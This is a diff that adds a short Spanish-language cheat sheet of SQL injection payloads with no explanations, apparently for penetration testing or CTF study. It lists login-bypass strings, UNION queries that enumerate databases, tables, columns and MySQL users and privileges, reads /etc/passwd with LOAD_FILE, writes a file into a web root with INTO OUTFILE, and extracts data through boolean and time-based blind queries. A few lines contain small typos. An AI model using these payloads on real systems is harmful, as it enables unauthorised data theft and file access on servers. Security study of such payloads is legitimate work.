@@ -1,0 +1,29 @@
+	#### Payloads de SQLi
+Payloads de sql_injection.txt sin explicaciones de cada uno. Mas info en sql_injection.txt
+
+## Basic
+admin'--
+admin' or '1'='1
+something' or '1'='1
+something'or sleep(5)-- -
+admin')--
+
+## Union
+' order by 1-- -
+' UNION select 1,2,3,4,<cols>-- -
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+' UNION select 1,database(),2,3-- -
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'- -
+' UNION select 1,COLUMN_NAME,2,3 from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- -
+' UNION select 1, <columna1>, <columna2>, 4 from <database>.<table>-- -
+' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+' UNION SELECT 1, user(), 3, 4-- -
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+## Obtener info mediante errores o tiempo
+'or if(substr(database(),1,1)='letra',sleep(5),1)-- -
+'or (select substr(database(),1,1))='letra'-- -
+'or (select subsstr(username,1,1) from users limit 1)='letra'-- -
